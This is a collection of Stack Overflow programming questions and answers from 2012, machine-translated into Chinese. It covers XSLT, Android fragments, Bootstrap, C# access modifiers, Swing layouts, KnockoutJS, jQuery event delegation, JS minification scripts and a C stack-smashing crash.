# xslt-2.0 - 比较 Xsl 变量

> ID：12392859
> 
> 赞同：0
> 
> 时间：2012-09-12T16:46:21.523
> 
> 标签：xslt-2.0

我的Xsl代码是这样的，即使isFlag为真，我也无法进入，

```
<xsl:variable name="isFlag" select="java:isCustomerUnique($samledata)"/>     </xsl:variable>
         <xsl:choose>
         <xsl:when test="$isFlag = 'true'">
                  <uniqueData><xsl:value-of select="$uniqueData"/></uniqueData>
                  <isUnique><xsl:value-of select="$isUnique"/></isUnique> 
```

**如果条件是，我无法检查条件**

```
<xsl:when test="$isFlag = 'true'"> 
```

**它工作正常，如果我这样改变**

```
<xsl:when test="'true'= 'true'"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T08:03:24.223

结论是，变量`$isFlag`不是`'true'`。

要调试文档处理，只需在之前添加以下行`xsl:choose`以获得实际值`$isFlag`：

```
<xsl:message terminate="no">The value of $isFlag is "<xsl:value-of select="$isFlag"/>"</xsl:message> 
```

要停止文档处理，您可以将属性设置`terminate`为`yes`。

# android - android throw InflateException 二进制 xml 文件行：错误膨胀类片段

> ID：12392860
> 
> 赞同：6
> 
> 时间：2012-09-12T16:46:31.630
> 
> 标签：android, fragment

我有一个 Activity 类，它实现了一个带有两个选项卡的 Actionbar。每个 Tab 都在 TabListener 上调用另一个 Fragment??.class。如果我启动应用程序，则会调用 FragmentXY.class。我可以毫无问题地切换到第二个选项卡。但是，如果我切换回包含其他两个片段作为分屏的第一个选项卡，则应用程序崩溃并抛出错误：InflateException binary xml file line : Error inflating class fragment

```
tab = actionBar
    .newTab()
    .setText("My Box")
    .setIcon(android.R.drawable.ic_menu_help)
    .setTabListener(new MyTabListener<FragmentXY>(this, "myXY",FragmentXY.class));
    actionBar.addTab(tab);

tab = actionBar
    .newTab()
    .setText("QR-Code")
    .setIcon(android.R.drawable.ic_menu_add)
    .setTabListener(new MyTabListener<FragmentXYZ>(this, "barcode",FragmentXYZ.class));

actionBar.addTab(tab); 
```

每个 Fragment.class 都调用一个 xml 资源，该资源包含一次其他两个片段或仅一个片段。

片段XY.class

```
@Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.first_tab, container, false);
        return view;
    } 
```

first_tab.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >
    <fragment
        android:name="com.febro.myfragmenttest.ListFragment"
        android:id="@+id/listFragment"
        android:layout_width="250dp"
        android:layout_height="match_parent"
        android:layout_marginTop="?android:attr/actionBarSize"
        class="com.febro.myfragmenttest.ListFragment" ></fragment>

    <fragment
        android:name="com.febro.myfragmenttest.DetailFragment"
        android:id="@+id/detailFragment"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        class="com.febro.myfragmenttest.DetailFragment" >
    </fragment>

</LinearLayout> 
```

回调方法有问题吗？

这是来自 logcat 的完整错误报告：

```
09-12 19:57:06.300: D/AndroidRuntime(2799): Shutting down VM
09-12 19:57:06.300: W/dalvikvm(2799): threadid=1: thread exiting with uncaught exception (group=0x4015d760)
09-12 19:57:06.310: E/AndroidRuntime(2799): FATAL EXCEPTION: main
09-12 19:57:06.310: E/AndroidRuntime(2799): android.view.InflateException: Binary XML file line #6: Error inflating class fragment
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:688)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.view.LayoutInflater.rInflate(LayoutInflater.java:724)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.view.LayoutInflater.inflate(LayoutInflater.java:479)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.view.LayoutInflater.inflate(LayoutInflater.java:391)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at com.febro.myfragmenttest.FragmentXY.onCreateView(FragmentXY.java:26)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.FragmentManagerImpl.moveToState(FragmentManager.java:776)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.FragmentManagerImpl.attachFragment(FragmentManager.java:1133)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.BackStackRecord.run(BackStackRecord.java:628)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1309)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.FragmentManagerImpl$1.run(FragmentManager.java:398)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.os.Handler.handleCallback(Handler.java:587)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.os.Handler.dispatchMessage(Handler.java:92)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.os.Looper.loop(Looper.java:132)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.ActivityThread.main(ActivityThread.java:4126)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at java.lang.reflect.Method.invokeNative(Native Method)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at java.lang.reflect.Method.invoke(Method.java:491)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at dalvik.system.NativeStart.main(Native Method)
09-12 19:57:06.310: E/AndroidRuntime(2799): Caused by: java.lang.IllegalArgumentException: Binary XML file line #6: Duplicate id 0x7f090008, tag null, or parent id 0xffffffff with another fragment for com.febro.myfragmenttest.ListFragment
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.app.Activity.onCreateView(Activity.java:4182)
09-12 19:57:06.310: E/AndroidRuntime(2799):     at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:664)
09-12 19:57:06.310: E/AndroidRuntime(2799):     ... 18 more
09-12 19:57:06.320: W/ActivityManager(302):   Force finishing activity com.febro.myfragmenttest/.ActionbarMain
09-12 19:57:06.400: D/dalvikvm(302): GC_FOR_ALLOC freed 13157K, 52% free 12567K/26055K, paused 68ms 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:43:07.763

简单地扩展你的类扩展 FragmentActivity

而不是扩展活动

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T02:07:54.503

```
<fragment
    android:name="com.febro.myfragmenttest.ListFragment"
    android:id="@+id/listFragment"
    android:layout_width="250dp"
    android:layout_height="match_parent"
    android:layout_marginTop="?android:attr/actionBarSize"
    class="com.febro.myfragmenttest.ListFragment" ></fragment> 
```

在此标记中，您将 android:name 和 class 设置为相同的内容。由于这些映射到同一事物，因此您应该只使用一个。这就是为什么它出现在堆栈跟踪中的原因：

```
java.lang.IllegalArgumentException: Binary XML file line #6: *Duplicate id* .... 
```

在[Fragment](http://developer.android.com/guide/components/fragments.html) android 指南中，他们出于相同目的交替使用这些。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-15T21:16:29.260

我遇到了同样的错误（不同的实现）。根本原因是因为在膨胀的片段类中返回的视图（即从片段的onCreateView() 方法返回）是无效的，或者您没有实现onCreateView 方法本身。

在您的情况下，检查您在 com.febro.myfragmenttest.ListFragment 中返回的视图并验证它是否有效。我建议在 onCreateView 方法中设置一个断点。

希望这可以帮助。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-08T13:54:28.330

你必须写

```
super.onCreateView(inflater, container, savedInstanceState); 
```

在您的 onCreateView 方法中。

# ruby-on-rails - 引导输入文本字段太小？

> ID：12392868
> 
> 赞同：2
> 
> 时间：2012-09-12T16:47:06.740
> 
> 标签：ruby-on-rails, twitter-bootstrap

我没有足够的积分来发布图片，但我正在做一个项目，输入文本字段比[http://twitter.github.com/bootstrap/index.html](http://twitter.github.com/bootstrap/index.html)网站上的要小得多。我`<!DOCTYPE html>`在 application.html.erb 中有，但它仍然不起作用。

有人知道问题可能是什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T07:45:20.890

文本框的宽度可能受父 html 标记的宽度影响。如果没有看到 html 标记，我无法确定。输入文本字段的默认宽度在 bootstrap.css 中定义。您可以通过将所需的跨度类包含到控件中来覆盖此宽度，如下所示。

```
<input type="text" class="span3" />
<input type="text" class="span12" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T18:04:21.790

最好使用 chrome 检查器检查输入字段的 CSS 规则。如果这不起作用，您可以将类或 ID 添加到所需的输入字段，然后在自定义 CSS 文件中设置类或 ID 的宽度。这将更改输入字段的大小。只需确保您的自定义 css 文件位于引导 css 文件之后。

# c# - 班级与公共班级

> ID：12392876
> 
> 赞同：67
> 
> 时间：2012-09-12T16:47:43.640
> 
> 标签：c#, class, public

有什么区别：

```
namespace Library{
    class File{
        //code inside it
   }
} 
```

和：

```
namespace Library{
   public class File{
       //code inside it
   }
} 
```

**那么public class**和**class**有什么区别呢？

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-09-12T16:48:36.587

不指定`public`类是隐式的`internal`。这意味着该类仅在同一程序集中可见。当您指定`public`时，该类在程序集外可见。

还允许`internal`显式指定修饰符：

```
internal class Foo {} 
```

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2012-09-12T16:55:37.210

前者相当于：

```
namespace Library{
    internal class File{
        //code inside it
   }
} 
```

所有可见性默认为尽可能不可见 -`private`对于`class`es 和`struct`s 的成员（方法、属性、字段、嵌套类和嵌套`enum`s）以及 s`internal`的直接成员`namespace`，因为它们不能是私有的。

`internal`意味着同一个程序集中的其他代码可以看到它，但没有别的（除非朋友程序集和使用反射）。

这有两个原因：

1.  无论如何，您应该有意识地使事物尽可能少地使用可见性，以加强您的封装。
2.  如果他们默认`public`您，可能会意外地公开一些应该是私有的或内部的。如果你不小心使某些东西不够可见，你会得到一个明显的编译错误并修复它。如果你不小心让某些东西太显眼，你就会在你的代码中引入一个不会被标记为错误的缺陷，这将是一个需要稍后修复的重大更改。

通常认为更好的风格是使用访问修饰符明确，在代码中更清晰，就是发生了什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:48:26.427

默认情况下，所有`class`es （以及所有类型）都是`internal`，所以为了让它们可以从外部访问（没有类似的东西`InternalsVisibleToAttribute`），你必须`public`明确地制作它们。

# java - 如何在两列之间动态平均分配添加组件？

> ID：12392878
> 
> 赞同：1
> 
> 时间：2012-09-12T16:47:49.413
> 
> 标签：java, swing, gridbaglayout

我目前有一个 JButtons 数组，我想将它们放在我的 JPanel 上，分成两列，均匀分布。因此，如果数组中有 8 个按钮，则左列将有 4 个按钮，右列将有 4 个按钮。但是，如果数组中有 7 个按钮，则左列将有 4 个按钮，右列将有 3 个按钮。

我开始为这种场景创建一些基本逻辑，并想看看我制作的代码中是否存在任何逻辑错误（或者可能是更好的方法）。

这是我想出的代码

```
public class SwingTest {

    public static void main(String[] args) {
        JFrame frame = new JFrame();

        JButton b1 = new JButton();
        b1.setText("Button1");

        JButton b2 = new JButton();
        b2.setText("Button2");

        JButton b3 = new JButton();
        b3.setText("Button3");

        JButton b4 = new JButton();
        b4.setText("Button4");

        JButton b5 = new JButton();
        b5.setText("Button5");

        JButton b6 = new JButton();
        b6.setText("Button6");

        ArrayList<JButton> jButtonList = new ArrayList();
        jButtonList.add(b1);
        jButtonList.add(b2);
        jButtonList.add(b3);
        jButtonList.add(b4);
        jButtonList.add(b5);
        jButtonList.add(b6);

        JPanel panel = new JPanel();
        panel.setLayout(new java.awt.GridBagLayout());

        double halfList = Math.ceil((jButtonList.size() / 2.0));
        int gridX = 0, gridY = 0;

        for(int i = 0; i < jButtonList.size(); i++) {
            GridBagConstraints gridBagConstraints = new java.awt.GridBagConstraints();

            if(gridY == (int)halfList) {
                gridX++;
                gridY = 0;
            }
            gridBagConstraints.gridx = gridX;
            gridBagConstraints.gridy = gridY;
            gridBagConstraints.fill = java.awt.GridBagConstraints.BOTH;
            gridBagConstraints.weightx = 1.0;
            gridBagConstraints.weighty = 1.0;
            gridBagConstraints.insets = new java.awt.Insets(1, 0, 1, 0);
            panel.add(jButtonList.get(i), gridBagConstraints);
            gridY++;
        }
        frame.add(panel);
        frame.pack();
        frame.setVisible(true);
    }
} 
```

示例代码似乎可以正常工作，但是否会出现打嗝的情况？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:54:03.893

您可以使用带有 GridLayout 的 JPanel，在其构造函数中传递 0 行和 2 列：

```
JPanel panel = new JPanel(new GridLayout(0 ,2)); 
```

这意味着当您向其添加组件时面板的高度会增加，同时始终保持 2 列

添加 JButton 的代码将非常简单：

```
for(int i = 0; i < jButtonList.size(); i++) {
    panel.add(jButtonList.get(i));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:55:05.277

为此使用 a`GridBagLayout`似乎是一个不错的计划。

但是，我会稍微清理一下按钮构建代码。如果您需要 100 个按钮会怎样？手动添加 100 个按钮似乎不是一个好主意。我将有一个用于构建和返回按钮的参数化方法和一个用于将按钮添加到您的`ArrayList`.

# javascript - KnockoutJS + CoffeeScript 的清单问题

> ID：12392879
> 
> 赞同：0
> 
> 时间：2012-09-12T16:47:53.990
> 
> 标签：javascript, knockout.js, coffeescript, knockout-2.0

我正在尝试使用 KnockoutJS 和 CoffeScritp 创建一个简单的清单；

为此，我在 coffescript 中创建了一个类来表示任务。在这个类中，我有一个计算属性`HasFinalized`来表示检查。基本上，如果满足完成日期，那么任务就完成了。

但是任务中的任何更改都会传播到另一个任务。

我在 Findlee 中创建了一个示例：http: [//jsfiddle.net/Ridermansb/pr3Ah/](http://jsfiddle.net/Ridermansb/pr3Ah/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-21T19:09:39.330

我已经简化并重写了您的脚本，因此可以应用模板。

JSFiddle：http: [//jsfiddle.net/sVyuC/](http://jsfiddle.net/sVyuC/)

由于我只是 Knockout 的初学者，无法清楚地解释为什么您的脚本不起作用，但我认为原因是您将 HasFinalized 绑定到复选框，而不是绑定到已完成的 ko.observable 对象。

希望您能理解我的话，并且您可以在 Knockout 的文档中找到更多示例。模板绑定： http: [//knockoutjs.com/documentation/template-binding.html](http://knockoutjs.com/documentation/template-binding.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T17:51:24.760

您需要在构造函数中指定实例变量，或者它们由所有实例共享（因为它们属于原型）。这是[JSFiddle](http://jsfiddle.net/pr3Ah/6/)。

# java - 为什么无法实例化 System 类

> ID：12392888
> 
> 赞同：-4
> 
> 时间：2012-09-12T16:48:19.807
> 
> 标签：java

尽管 System 是一个具体的类，但它不能被实例化。

> test.java:4: System() 在 java.lang.System 中具有私有访问权限

我知道不允许创建对象。问题是为什么……？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-12T16:49:12.963

它不能被实例化，因为它有一个私有构造函数。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-12T16:49:40.847

因为没有理由实例化它。那不是它的用途。

它就是一堆静态方法和属性。

# jquery - jQuery对点击添加的类没有反应

> ID：12392891
> 
> 赞同：0
> 
> 时间：2012-09-12T16:48:32.947
> 
> 标签：jquery, click, addclass, removeclass

我有一个相当简单的脚本，我希望在加载 jQuery 时让 div 消失，添加一个“触发器”元素，我可以单击该元素以使 div 再次出现。然后“触发器”的类被更改，当我再次单击它时，div 应该再次消失。不幸的是，脚本工作正常，直到“触发器”类被更改，如果我再次单击它没有任何反应。

**问题已解决**

这是**工作**的JS：

```
$(document).ready(function () {
if ($('#Bestellungen #Offene .products')) {
    $('#Bestellungen #Offene .products').hide();
    $('#Bestellungen #Offene .products').before('<div class="trigger"></div>');
    $('#Bestellungen #Offene').on('click', '.trigger', function () {
        $(this).addClass('minus').next().show();
    });
    $('#Bestellungen #Offene').on('click', '.trigger.minus', function () {
        $(this).removeClass('minus').next().hide();
    });
} 
```

});

这里是 HTML：

```
<div id="Bestellungen">
<div id="Offene">
    <table>
        <tr>
            <td>
                <div class="products">blablabla</div>
            <td>
        </tr>
    </table>
</div> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-12T16:49:39.027

如果是动态添加的`class`元素，您需要委托事件。因为，具有动态`class`或的元素`id`被视为`dynamic`具有该`class`或的元素`id`。

当您稍后添加该类`minus`时`.trigger`，`.trigger.minus`将其视为动态元素。

所以试试：

```
$('#Bestellungen #Offene').on('click', '.trigger.minus', function () {
    $(this).removeClass('minus').next().hide();
}); 
```

为了实现委托事件，您需要使用***[`.on()`](http://api.jquery.com/on)***上面的 jQuery 方法。

### 笔记

委托事件的语法`.on()`是：

```
$(StaticParentElement).on(eventName, target, handlerFunction); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:55:37.190

使用`on`附件过程。

```
$(document).ready(function () {
if ($('#Bestellungen #Offene .products')) {
    $('#Bestellungen #Offene .products').hide();
    $('#Bestellungen #Offene .products').before('<div class="trigger"></div>');
    $('#Bestellungen #Offene').on('click', '.trigger:not(.minus)', function () {
        $(this).addClass('minus').next().show();
    });

    /* This is the section that doesn't work */
    $('#Bestellungen #Offene').on('click',  '.trigger.minus', function () {
        $(this).removeClass('minus').next().hide();
    });
} 
```

此外，您需要`.minus`从第一个事件处理程序中过滤掉具有该类的元素，以便在单击具有`.minus`该类的项目时不会执行它们。

或者，您可以像这样编写代码：

```
$(document).ready(function () {
if ($('#Bestellungen #Offene .products')) {
    $('#Bestellungen #Offene .products').hide();
    $('#Bestellungen #Offene .products').before('<div class="trigger"></div>');
    $('#Bestellungen #Offene .trigger').click(function () {
        $(this).toggleClass('minus').next().toggle();
    });
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T17:01:27.533

它不起作用，因为您没有将“减号”处理程序附加到元素，因为在您尝试绑定它时它没有类。
您可以使用 on 将事件附加到父元素，然后让选择器匹配您的目标，或者您也可以对这两种情况使用单个处理程序：

```
$('#Bestellungen #Offene .trigger').click(function () {
    $(this).toggleClass('minus').next().toggle($(this).hasClass('minus'));
}); 
```

这是有效的，因为切换函数接受一个布尔参数，指示是显示还是隐藏元素。

# javascript - 查找/替换任意 JS 属性以获得更好的压缩

> ID：12392899
> 
> 赞同：3
> 
> 时间：2012-09-12T16:49:19.073
> 
> 标签：javascript, shell, batch-file, replace, minify

如果我可以精细地缩小那些我知道是任意的但在标准设置上没有被缩小的属性，我可以有效地减少我们的一些 JS 生产代码的大小。也就是说，当高级缩小设置太成问题时，以缩小的方式将它们替换为像“a”这样的单个字符。可以使用逗号分隔的已知可替换字符串列表将文本文件作为项目的一部分进行维护。

有没有人有可以实现这一点的 bat 或 shell 脚本，甚至是手动从 csv 中的每个文件？或者另一个实现相同目标的建议？我在 Windows 上，所以 sh 脚本需要在 Git bash 中工作，无论如何对我来说 :)

与查找/替换方面一样，需要生成替换字符串以使其唯一但尽可能短。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T18:28:32.200

好的，我在[JSFiddle](http://jsfiddle.net/Lh5xU/11/)中发布了一个基本的 JavaScript / HTML 解决方案。这是没有 HTML 和 CSS 的 JavaScript 代码：

```
rndCh = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
rndLen = rndCh.length;

// Generate random string from number
function genRand(index) {
    var ni = [], rv = "";
    while (index > 0) {
        ni.push(index % 62);
        index = ~~(index / 62);
    }
    if (!ni.length) {
        ni.push(0);
    }
    while (ni.length > 0) {
        rv += rndCh[ni.pop()];
    }
    return rv;
}

$(document).ready(function() {
    $("#gobutton").on("click", function(e) {
        var prefix, code, rlist, ir, nrep, nrval;

        prefix = $("#myprefix").val();
        if (!prefix) {
            alert("Need prefix");
            return;
        }
        code = $("#mycode").val();
        if (!code) {
            alert("Need code");
            return;
        }
        rlist = $("#mylist").val();
        if (!rlist || !rlist.length) {
            alert("Need replacement list");
            return;
        }
        rlist = rlist.split(",");

        for (ir = 0;  ir < rlist.length;  ++ir) {
            if (rlist[ir]) {
                // Generate next random
                nrval = prefix + genRand(ir);
                nrep = new RegExp(rlist[ir], "g");
                code = code.replace(nrep, nrval);
            }
        }

        $("#myoutput").val(code);
    });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T23:00:45.713

这是为那些不想使用 JavaScript 的人准备的 C++ 版本。它仅使用标准 C++ 库。

```
#include <stdio.h>
#include <io.h>
#include <string.h>

#include <vector>
#include <string>

void Usage(const char* msg = NULL)
{
    if (msg)
        printf("%s\n", msg);
    printf("Usage: coderep (prefix) (infile) (listfile) (outfile)\n");
}

char* OpenAndReadFile(const char* filename)
{
    FILE* fp = fopen(filename, "rb");
    if (!fp)
        return NULL;
    fseek(fp, 0, SEEK_END);
    int size = (int)ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char* buf = new char[size + 2];
    fread(buf, 1, size, fp);
    buf[size] = '\0';
    fclose(fp);
    return buf;
}

void ReplaceAll(std::string& str, const std::string& from, const std::string& to)
{
    size_t start_pos = 0;
    while ((start_pos = str.find(from, start_pos)) != std::string::npos)
    {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
}

char* rndCh = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
int rndLen = 62;

// Generate random string from number
void genRand(int index, std::string* str)
{
    std::vector<int> ni;
    while (index > 0)
    {
        ni.push_back(index % 62);
        index = index / 62;
    }
    if (!ni.size())
        ni.push_back(0);

    std::vector<int>::reverse_iterator ip;
    for (ip = ni.rbegin();  ip != ni.rend();  ++ip)
        (*str) += rndCh[*ip];
}

int main(int argc, char* argv[])
{
    if (argc != 5)
    {
        Usage();
        return 1;
    }

    // Read inputs and check parms
    const char* prefix = argv[1];
    char* code = OpenAndReadFile(argv[2]);
    if (!code || !*code)
    {
        Usage("Failed reading code");
        return 1;
    }
    char* list = OpenAndReadFile(argv[3]);
    if (!list || !*list)
    {
        delete[] code;
        Usage("Failed reading list");
        return 1;
    }
    const char* outfile = argv[4];
    if (!outfile || !*outfile)
    {
        Usage("Need output file");
        return 1;
    }

    // Split list
    std::string scode(code);
    std::vector<std::string> vlist;
    std::string acc;
    const char* lp = list;
    while (*lp)
    {
        if (*lp == L',')
        {
            vlist.push_back(acc);
            acc.clear();
        }
        else
        {
            acc += *lp;
        }
        ++lp;
    }
    if (acc.size() > 0)
        vlist.push_back(acc);

    // Do translation
    int index = 0;
    std::string rstr;
    std::vector<std::string>::iterator ilist;
    for (ilist = vlist.begin();  ilist != vlist.end();  ++ilist)
    {
        rstr = prefix;
        genRand(index, &rstr);
        ++index;

        ReplaceAll(scode, *ilist, rstr);
    }

    // Write results
    FILE* outp = fopen(outfile, "wb");
    if (!outp)
    {
        Usage("Error creating output file");
        return 1;
    }
    fwrite(scode.c_str(), sizeof(char), scode.size(), outp);
    fclose(outp);

    return 0;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-13T08:59:52.490

既然你说 sed 可用，我已经在 sed 中测试了一个解决方案，以下应该可以解决问题：

```
sed -i -e 's:\bfirstNeedle\b:firstReplacement:g' -e 's:\bsecondNeedle\b:secondReplacement:g' [... and so on...] /path/to/first/file /path/to/second/file [etc...] 
```

该`-i`标志表示就地编辑（因此它会覆盖提供的原始文件（我当然会事先备份您的文件夹）。使用`-e`标志（表达式）轻松提供每个替换。替换本身就是`s`表示替换，后跟一个分隔符，一个与您要替换的内容匹配的正则表达式，另一个分隔符，然后是您要使用的替换；这也可以使用正则表达式中的分组，因此您可以执行以下操作（或任何其他此类技巧）：

```
sed -i -e 's:\bget(([A-Z]{1,3})[a-zA-Z]*\(\)):g\1:g' 
```

这将匹配 getter 并用 g[first-1-to-3-letters-of-next-word] 替换它们，从而轻松缩短它们。当然，这并不能保证唯一性，您必须自己确保这一点。

如果您有很多替换要做，您可以通过将它们成对放置在文件中`original=replacement`（每行一个）来创建表达式，然后用于`echo $(sed -e "s:([^=]*)=(.*):-e\ 's=\b\1\b\2=g':" /path/to/replacements/file)`打印替换列表。（这里我使用`=`分隔符只是为了让替换文件更容易理解和可能重复使用，随意使用你想要的任何分隔符）。

# android - 为什么无法在 onConfigurationChanged() 中的 edittexts 上设置值？

> ID：12392904
> 
> 赞同：0
> 
> 时间：2012-09-12T16:49:38.317
> 
> 标签：android, android-edittext, reset

对于各自的模式，layout 和 layout-land 中有两个不同的 xml 文件。因为即使方向改变，我也想在编辑文本中设置值，所以我`android:configChanges="orientation|keyboardHidden"`在清单文件中使用。这会再次停用 onCreate() 方法的执行，并且不会破坏当前活动。

我的应用程序中有两个框架。第一帧包含 25 个编辑文本，第二帧包含 10 个按钮。因此，在纵向模式下，这些帧是一个接一个，而在横向模式下，这些帧是一个接一个。为了根据模式得到这个视图，我`setContentView(R.layout.main);`在`onConfigurationChanged()`方法中写了。但我的问题是我能够将已经在 editTexts 中输入的值存储在`onConfigurationChanged()`. 但是在设置为相应的布局后，我无法将值设置回编辑文本。因为我得到了各自的布局，但编辑文本为空。以下代码片段概述了我的问题。

```
public void onCreate()
{
setContentView(R.layout.main);
gridView = (GridView) findViewById(R.id.gridView1);
gridView.setAdapter(new EditTextAdapter(this)); //This creates 25 edittexts in the gridview which is in first frame.

} 

public void getEditTexts()//getting the edittext objects here in the activity class
{
editText1=gridView.getChildAt(k);
...........
...........
}

public void onConfigurationChanged()
{
String s1=editText1.getText().toString();//Here I am using technique to store the values.

setContentView(R.layout.main);
gridView.setAdapter(new EditTextAdapter(this));
getEditTexts();
editText1.setText(s1);    //here is my problem. I am unable to set values back in the editText.

} 
```

我哪里错了？如果在以前的模式下设置了值，如何在当前模式下的 25 个编辑文本中像这样设置值。请建议。在这里，我猜这些值是在旧的 edittext 对象本身中设置的，即使模式发生了变化。如何在新的 edittext 对象中设置值？如果当前布局中不存在旧的 edittext 对象，这些值又是如何设置的？或者这个问题还有其他原因？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T11:12:42.870

我已经为您的要求创建了一个替代应用程序。我还没有使用网格视图，但我可以在没有 XML 的情况下添加任意数量的视图。该代码检查设备配置和视图大小，并将那么多行和列添加到布局中。这是一个基本示例，您可以根据需要对其进行修改。
这是代码的[链接](https://www.dropbox.com/sh/gazxxpe3e2yvyes/7ntq-oMVUA)

如有任何疑问，请随时讨论。

# c - SIGABRT 在 fclose 上？

> ID：12392912
> 
> 赞同：3
> 
> 时间：2012-09-12T16:50:17.747
> 
> 标签：c

我无法让一些 C 代码正确运行（如果这个问题很愚蠢，请多多包涵，因为我是 C 新手；另外，所以每个人都很清楚，这是我在运行时遇到问题的代码。我唯一的部分'已经写的是空文件句柄检查）。基本上，我的程序在`fclose`. 先上代码：

在文件的顶部：

```
int *label; 
```

具体方法：

```
void load_dat ()
{
  int    i, j, t, k;
  FILE   *in;
  char   t_file[16];

  printf ("\nName of Raw Data File > ");
  scanf ("%s", t_file);
  in = fopen (t_file, "r");
  if (in == NULL){
    perror("fopen error");
  }
 fscanf (in, "%d %d %d", &num_pats, &a_length, &b_length);

 dpt = (float **) malloc (sizeof(float *)*num_pats);

 for (k=0; k<num_pats; k++){
    dpt[k] = (float *) malloc (sizeof(float)*(a_length+b_length));
 }

 label = (int *) malloc (sizeof(int)*num_pats);

  for (i=0; i<num_pats; i++)
  {
      for (j=0; j<a_length; j++)
      {
        fscanf (in, "%f", &dpt[i][j]);
      }

  fscanf (in, "%d", &label[i]);

  if (label[i]<0 || label[i]>3)
    printf ("ERROR: Label corrupted.\n");

    for (t=0; t<b_length; t++){
        dpt[i][t+a_length] = 0.0;
        dpt[i][label[i]+a_length] = 1.0;
    }
  }
  fclose (in); 
} 
```

我的程序错误信息是：`Abort trap: 6`. 谷歌搜索最终导致了我使用的建议`GBD`，这给了我：

```
Program received signal SIGABRT, Aborted. 
```

和

```
#0  0x00007fff8c12582a in __kill ()
#1  0x00007fff871a3b6c in __abort ()  
#2  0x00007fff871a0070 in __stack_chk_fail ()
#3  0x000000010000175f in load_dat ()
#4  0x0000000100001baa in main ()
#5  0x00000001000013e4 in start () 
```

如果我单步执行整个方法，程序不会崩溃，直到我到达最后一行`fclose(in)`。此外， 的值`in`在整个程序中保持不变。

搜索与 相关的问题时`fclose`，我遇到了[这个 SO 帖子](https://stackoverflow.com/questions/2334352/why-do-i-get-a-sigabrt-here)，这导致我尝试使用`Valgrind`，其输出（使用`--leak-check=yes`）是：

```
==22688== 
==22688== Process terminating with default action of signal 6 (SIGABRT)
==22688==    at 0x2DD82A: __kill (in /usr/lib/system/libsystem_kernel.dylib)
==22688==    by 0x18A06F: __stack_chk_fail (in /usr/lib/system/libsystem_c.dylib)
==22688==    by 0x10000175E: load_dat (in ./dataPre) 
==22688==    by 0x100001BA9: main (in ./dataPre)
==22688== 
==22688== HEAP SUMMARY:
==22688==     in use at exit: 28,781 bytes in 83 blocks
==22688==   total heap usage: 84 allocs, 1 frees, 32,877 bytes allocated
==22688== 
==22688== LEAK SUMMARY:
==22688==    definitely lost: 0 bytes in 0 blocks
==22688==    indirectly lost: 0 bytes in 0 blocks
==22688==      possibly lost: 0 bytes in 0 blocks
==22688==    still reachable: 28,781 bytes in 83 blocks
==22688==         suppressed: 0 bytes in 0 blocks
==22688== Reachable blocks (those to which a pointer was found) are not shown.
==22688== To see them, rerun with: --leak-check=full --show-reachable=yes
==22688== 
==22688== For counts of detected and suppressed errors, rerun with: -v
==22688== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
Abort trap: 6 
```

